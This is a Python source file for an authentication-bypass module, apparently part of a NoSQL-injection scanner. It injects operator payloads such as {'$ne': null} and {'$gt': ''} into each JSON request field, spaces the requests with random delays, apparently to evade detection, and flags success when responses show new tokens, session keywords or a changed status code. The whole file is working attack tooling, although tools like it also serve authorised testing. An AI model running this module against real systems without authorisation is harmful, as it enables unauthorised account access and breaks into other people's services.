import copy
import json
import time
import random
import os
import difflib
from core.logger import Logger

class AuthBypass:
    def __init__(self, requester, url, method, original_data, baseline_response, target_param=None):
        self.requester = requester
        self.url = url
        self.method = method
        self.original_data = original_data
        self.baseline = baseline_response
        self.target_param = target_param  
        self.logger = Logger()
        
        self.payloads = self.load_payloads()

    def load_payloads(self):
        """Reading payloads from core/payloads.json"""
        try:
            base_dir = os.path.dirname(os.path.dirname(os.path.dirname(__file__)))
            payload_path = os.path.join(base_dir, "core", "payloads.json")
            
            with open(payload_path, "r") as f:
                data = json.load(f)
                return data.get("auth_bypass", [])
        except Exception as e:
            self.logger.error(f"Failed to load payloads: {e}")
            return [{"$ne": None}, {"$gt": ""}]

    def run(self):
        self.logger.info(f"Starting Module: Authentication Bypass (Loaded {len(self.payloads)} payloads)")
        
        if self.target_param:
            self.logger.info(f"Targeting specific parameter: '{self.target_param}'")

        vulnerable = False

        if not self.original_data or not isinstance(self.original_data, dict):
            self.logger.warning("No JSON data found to inject.")
            return False

        for key in self.original_data.keys():
            if self.target_param and key != self.target_param:
                continue

            for payload in self.payloads:
                delay = random.uniform(1.5, 3.0)
                time.sleep(delay)

                attack_data = copy.deepcopy(self.original_data)
                attack_data[key] = payload
                
                payload_str = json.dumps(payload)
                self.logger.test(key, payload_str)

                try:
                    response = self.requester.send(self.url, self.method, attack_data)
                    
                    if response and self.is_successful(response):
                        self.logger.success("VULNERABILITY FOUND!")
                        self.logger.info(f"Vector: {key}")
                        self.logger.info(f"Payload: {payload_str}")
                        self.logger.info(f"Response Code: {response.status_code}")
                        
                        preview = response.text[:100].replace("\n", " ")
                        self.logger.info(f"Response Peek: {preview}...")
                        
                        vulnerable = True
                        return True
                except Exception:
                    pass
        
        if not vulnerable:
            self.logger.error("No Auth Bypass vulnerabilities found.")
        
        return vulnerable

    def is_successful(self, response):
        
        if response.status_code == 200 and self.baseline.status_code != 200:
            return True
            
        success_keywords = ["token", "success", "dashboard", "welcome", "auth_token", "session", "id_token"]
        for word in success_keywords:
            if word in response.text.lower() and word not in self.baseline.text.lower():
                return True
        
        if response.text and self.baseline.text:
            matcher = difflib.SequenceMatcher(None, self.baseline.text, response.text)
            similarity = matcher.ratio()
            
            if similarity < 0.90:
                error_keywords = ["error", "invalid", "failed", "bad request", "forbidden", "denied"]
                is_error = False
                for err in error_keywords:
                    if err in response.text.lower() and err not in self.baseline.text.lower():
                        is_error = True
                        break
                
                if not is_error:
                    return True
        
        return False